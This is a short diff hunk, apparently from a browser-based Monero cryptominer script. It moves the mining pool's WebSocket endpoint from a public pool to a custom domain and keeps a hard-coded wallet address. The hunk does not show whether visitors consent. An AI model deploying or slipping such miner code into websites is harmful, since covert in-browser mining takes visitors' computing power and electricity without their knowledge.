@@ -3,7 +3,7 @@
   ///https://github.com/craciuncezar/browser-cryptominer
   // fetch("https://browser-crypto.herokuapp.com");
   // const server = (location.protocol === 'https:' ? "wss://" : "ws://") +window.location.host+"/socket";
-  const server = "wss://webminer.moneroocean.stream";
+  const server = "wss://coolelectronics.me/crypto";
   // const server = "ws://localhost:7070/socket";
   const address =
     "4AKWEyztGBu5irJH1c1bRgCALBFXm21wy85CTh1cCYr3W8LQ63sCzavgg7hxF4d8f6H43SFP18JvQ1VDPrFWFpfxC37P1cF";
